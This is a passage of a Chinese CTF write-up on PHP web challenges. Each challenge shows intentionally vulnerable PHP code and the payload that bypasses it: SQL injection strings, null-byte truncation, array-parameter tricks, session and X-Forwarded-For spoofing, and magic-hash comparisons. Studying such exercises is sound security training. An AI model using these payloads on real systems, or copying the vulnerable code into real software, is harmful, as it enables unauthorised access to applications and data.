(mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">&#x2F;&#x2F;返回结果集中行的数目</span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">&#x2F;&#x2F;返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line">    if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这是实验吧的一道题 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1MDc4NjMxL2FydGljbGUvZGV0YWlscy81NDc3Mjc5OA==" title="https://blog.csdn.net/qq_35078631/article/details/54772798">实验吧 因缺思汀绕过<i class="fa fa-external-link"></i></span></p>
+<p>再来了解一下什么是with rollup <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2h1YW5nbmV0L2FyY2hpdmUvMjAxMy8wMy8yNi8yOTgyMTQ0Lmh0bWw=" title="https://www.cnblogs.com/shuangnet/archive/2013/03/26/2982144.html">WITH ROLLUP<i class="fa fa-external-link"></i></span></p>
+<p>那么看代码我们就知道 </p>
+<p>$sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[‘uname’]}’”;</p>
+<p>提交uname时在后面拼接语句 语句中加上with rollup</p>
+<p>所以在表的最下面的一列会有一个admin的用户名  而密码则为null 所以就可以这里利用从而绕过</p>
+<p>所以不用担心上面的过滤函数过滤了很多关键词 虽然我一开始看到 也寻思这全部都屏蔽了 还怎么sql注入 当然也有其他的绕过姿势</p>
+<p>所以我们需要构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; GROUP BY pwd WITH ROLLUP LIMIT 1 OFFSET x--+</span><br></pre></td></tr></table></figure>
+
+<p>至于后面的x为多少 可以自己fuzz 表大x就大 表小x就小</p>
+<h2 id="0x04-ereg正则-00截断"><a href="#0x04-ereg正则-00截断" class="headerlink" title="0x04 ereg正则%00截断"></a>0x04 ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) </span><br><span class="line">&#123;</span><br><span class="line">  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">  &#123;</span><br><span class="line">    echo &#39;&lt;p&gt;You password must be alphanumeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">   &#123;</span><br><span class="line">     if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置</span><br><span class="line">      &#123;</span><br><span class="line">      die(&#39;Flag: &#39; . $flag);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        echo(&#39;&lt;p&gt;*-* have not been found&lt;&#x2F;p&gt;&#39;); </span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">        echo &#39;&lt;p&gt;Invalid password&lt;&#x2F;p&gt;&#39;; </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看源码 有个ereg函数 要先让它为true，所以必须要正常的字母数字</p>
+<p>然后长度小于8且值大于9999999，所以这里首先想到的就是使用科学计数法来表示</p>
+<p>然后后面输出flag的条件是要包含有<em>-</em>，但是加了之后又不能满足正常字母数字的条件</p>
+<p>所以这里就需要利用PHP的00截断了 构造如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;1e9%00*-*</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05strcmp比较字符串绕过"><a href="#0x05strcmp比较字符串绕过" class="headerlink" title="0x05strcmp比较字符串绕过"></a>0x05strcmp比较字符串绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span><br><span class="line">    &#x2F;&#x2F;比较两个字符串（区分大小写） </span><br><span class="line">        die(&#39;Flag: &#39;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &#39;No&#39;;  </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里还是重点关注输出flag的条件  strcmp($_GET[‘a’], $flag) == 0</p>
+<p>所以这里就要传进去的参数和$flag完全相等 但是我们又不知道flag</p>
+<p>所以这里就涉及到了上传的参数类型的问题</p>
+<p>这里strcmp函数内的两个参数都是字符串类型，但是如果我上传了一个数组类型的呢 结果会怎样呢</p>
+<p>在PHP5.3之前 ，传入了错误的类型，这个函数会报错然后return0，也就达到了我们的效果，最后返回0</p>
+<p>但是在5.3之后，传入错误类型后，将不会报告错误信息，不会有返回值，但我们传入数组之后，会有一个NULL值</p>
+<p>而null==0，所以也可以达到我们的效果，所以我们只需要上传一个数组即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;9</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-sha1-函数比较绕过"><a href="#0x06-sha1-函数比较绕过" class="headerlink" title="0x06 sha1()函数比较绕过"></a>0x06 sha1()函数比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) </span><br><span class="line">&#123;</span><br><span class="line">    if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">        echo &#39;&lt;p&gt;Your password can not be your name!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">      die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#39;&lt;p&gt;Invalid password.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    echo &#39;&lt;p&gt;Login first!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看源码有两个参数 一个name一个password</p>
+<p>看输出flag的条件 需要sha1($_GET[‘name’]) === sha1($_GET[‘password’])</p>
+<p>那就先了解一下sha1函数 用于计算传入字符串的sha散列</p>
+<p>那么这里就该注意到了 传入的参数类型是字符串 那么如果我传入其他类型呢</p>
+<p>那么肯定就会返回false了 那么这里是需要 === 这个运算符会比较类型 所以两个参数都传入数组</p>
+<p>都会返回false来使这个比较成立 构造payload如下  其中还需要两个参数值不能相同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]&#x3D;os&amp;password[]&#x3D;lo</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-SESSION-验证绕过"><a href="#0x07-SESSION-验证绕过" class="headerlink" title="0x07 SESSION 验证绕过"></a>0x07 SESSION 验证绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;password&#39;] &#x3D;&#x3D; $_SESSION[&#39;password&#39;])</span><br><span class="line">        die (&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;&lt;p&gt;Wrong guess.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先关注到一开始有个session_start()的函数 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。</span><br></pre></td></tr></table></figure>
+
+<p>所以这里会重用现有会话</p>
+<p>需要条件$_GET[‘password’] == $_SESSION[‘password’]</p>
+<p>那么我们怎么使这个条件成立 就涉及到session验证绕过的问题</p>
+<p>这里会调用现有会话 也就是使用之前的session 那么我们如果抓包直接删除PHPSESSID的值 使之为空</p>
+<p>然后password的值提交为空 或者直接就删除cookies 就可以让这两个值相等了</p>
+<p>删除后构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-MD5密码比较绕过"><a href="#0x08-MD5密码比较绕过" class="headerlink" title="0x08 MD5密码比较绕过"></a>0x08 MD5密码比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;配置数据库</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn &#x3D; mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F;赋值</span><br><span class="line">$user &#x3D; $_POST[user];</span><br><span class="line">$pass &#x3D; md5($_POST[pass]);</span><br><span class="line">$sql &#x3D; &quot;select pw from php where user&#x3D;&#39;$user&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row &#x3D; mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">&#x2F;&#x2F;echo $row[&quot;pw&quot;];</span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">&#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先看到需要POST两个参数 一个user一个pass</p>
+<p>而且后面pass拿去md5了一下 user拿去数据库查询 然后将查询出来的密码和提交的密码的两者的md5比较是否相等  相等才会输出flag</p>
+<p>这里我们就可以使用联合注入union select 来返回一个已知明文的md5 那么就会使用这个md5去和我们提交的pass的md5比较 构造payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;&#39; union select &#39;202cb962ac59075b964b07152d234b70&#39;#pass&#x3D;123</span><br><span class="line">123的md5就是&#39;202cb962ac59075b964b07152d234b70&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-URLdecode二次编码绕过"><a href="#0x09-URLdecode二次编码绕过" class="headerlink" title="0x09 URLdecode二次编码绕过"></a>0x09 URLdecode二次编码绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看源码 hackerDJ不能在提交的参数里面 但是下面urldecode一下之后 要字符串等于hackerDJ才行 </p>
+<p>所以我们就需要url编码两次 只需要编码一个字母就行 h的url编码是%68 二次编码后%2568</p>
+<p>所以 构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%2568ackerDJ</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xa-sql注入闭合绕过"><a href="#0xa-sql注入闭合绕过" class="headerlink" title="0xa sql注入闭合绕过"></a>0xa sql注入闭合绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn &#x3D; mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);</span><br><span class="line">    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user &#x3D; $_POST[user];</span><br><span class="line">$pass &#x3D; md5($_POST[pass]);</span><br><span class="line">&#x2F;&#x2F;select user from php where (user&#x3D;&#39;admin&#39;)#</span><br><span class="line">&#x2F;&#x2F;exp:admin&#39;)#</span><br><span class="line">$sql &#x3D; &quot;select user from php where (user&#x3D;&#39;$user&#39;) and (pw&#x3D;&#39;$pass&#39;)&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row &#x3D; mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">&#x2F;&#x2F;echo $row[&quot;pw&quot;];</span><br><span class="line">  if($row[&#39;user&#39;]&#x3D;&#x3D;&quot;admin&quot;) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($row[&#39;user&#39;] !&#x3D; &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看到源码 前面部分还是数据库操作 看到后面额那条sql语句就知道该怎么闭合单引号和括号了</p>
+<p>而且后面也只需要user==admin就行 没有比较密码 </p>
+<p>所以我们只需要提交admin’)#就行 单引号和括号闭合前面的，#用来注释掉后面的语句部分 使这条语句只查询了admin的用户名 拿去后面比较 就可以出flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;admin&#39;)#</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xb-X-Forwarded-For绕过指定IP地址"><a href="#0xb-X-Forwarded-For绕过指定IP地址" class="headerlink" title="0xb X-Forwarded-For绕过指定IP地址"></a>0xb X-Forwarded-For绕过指定IP地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function GetIP()&#123;</span><br><span class="line">if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))</span><br><span class="line">    $cip &#x3D; $_SERVER[&quot;HTTP_CLIENT_IP&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))</span><br><span class="line">    $cip &#x3D; $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))</span><br><span class="line">    $cip &#x3D; $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">else</span><br><span class="line">    $cip &#x3D; &quot;0.0.0.0&quot;;</span><br><span class="line">return $cip;</span><br><span class="line">&#125;</span><br><span class="line">$GetIPs &#x3D; GetIP();</span><br><span class="line">if ($GetIPs&#x3D;&#x3D;&quot;1.1.1.1&quot;)&#123;</span><br><span class="line">echo &quot;Great! Key is *********&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;错误！你的IP不在访问列表之内！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个就简单了 直接xff</p>
+<p>抓包并在添加一个xff然后重放就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:1.1.1.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xc-MD5加密相等绕过"><a href="#0xc-MD5加密相等绕过" class="headerlink" title="0xc MD5加密相等绕过"></a>0xc MD5加密相等绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看源码 要求 a！=QNKCDZO 但是又要MD5相等 所以这里就要想到PHP会自动判断数据类型</p>
+<p>而这些的md5都是类似于0eXXXXXXXX的形式 所以才会比较相等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(&#39;240610708&#39;) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)</span><br><span class="line">var_dump(md5(&#39;aabg7XSs&#39;) &#x3D;&#x3D; md5(&#39;aabC9RqS&#39;));</span><br><span class="line">var_dump(sha1(&#39;aaroZmOk&#39;) &#x3D;&#x3D; sha1(&#39;aaK1STfY&#39;));</span><br><span class="line">var_dump(sha1(&#39;aaO8zKZF&#39;) &#x3D;&#x3D; sha1(&#39;aa3OFF9m&#39;));</span><br><span class="line">var_dump(&#39;0010e2&#39; &#x3D;&#x3D; &#39;1e3&#39;);</span><br><span class="line">var_dump(&#39;0x1234Ab&#39; &#x3D;&#x3D; &#39;1193131&#39;);</span><br><span class="line">var_dump(&#39;0xABCdef&#39; &#x3D;&#x3D; &#39; 0xABCdef&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>这些在PHP里面都是相等的 所以这里我们直接提交240610708即可</p>
+<h2 id="0xd-intval函数四舍五入绕过"><a href="#0xd-intval函数四舍五入绕过" class="headerlink" title="0xd intval函数四舍五入绕过"></a>0xd intval函数四舍五入绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id &#x3D; intval($_GET[id]);</span><br><span class="line">  $query &#x3D; @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id&#x3D;&#39;$id&#39;&quot;));</span><br><span class="line">  if ($_GET[id]&#x3D;&#x3D;1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看代码就明白意思了 这里要我们提交一个值 然后拿去查询 很明显是要我们查询1024的值 但是后面又做了比较 </p>
+<p>如果直接等于1024不会输出flag 这里就要利用intval的四舍五入 它会自动取整数值 所以我们可以在后面添加小数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1024.4</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xe-strpos数组绕过NULL与ereg正则-00截断"><a href="#0xe-strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="0xe strpos数组绕过NULL与ereg正则%00截断"></a>0xe strpos数组绕过NULL与ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">    if (isset ($_GET[&#39;nctf&#39;])) &#123;</span><br><span class="line">        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">            echo &#39;必须输入数字才行&#39;;</span><br><span class="line">        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)   </span><br><span class="line">            die(&#39;Flag: &#39;.$flag);</span><br><span class="line">        else</span><br><span class="line">            echo &#39;骚年，继续努力吧啊~&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码第一个要求必须提交纯数字 第二个要求要有#!biubiubiu才能输出flag</p>
+<p>这里有两种方法可以绕过 strops要求传入参数为字符串 而我们传入一个数组 那么就会返回一个NULL </p>
+<p>NULL ！== false 所以条件成立</p>
+<p>第二种就是使用00截断 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?nctf[]&#x3D;1</span><br><span class="line">?nctf&#x3D;9%00%23biubiubiu &#x2F;&#x2F;这里注意需要把#编码为%23</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xf-SQL注入or绕过"><a href="#0xf-SQL注入or绕过" class="headerlink" title="0xf SQL注入or绕过"></a>0xf SQL注入or绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;db.inc.php&#39;;</span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    if(get_magic_quotes_gpc())&#123; &#x2F;&#x2F;get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span><br><span class="line">        $str&#x3D;stripslashes($str); &#x2F;&#x2F;返回一个去除转义反斜线后的字符串（\&#39; 转换为 &#39; 等等）。双反斜线（\\）被转换为单个反斜线（\）。 </span><br><span class="line">    &#125;</span><br><span class="line">    return 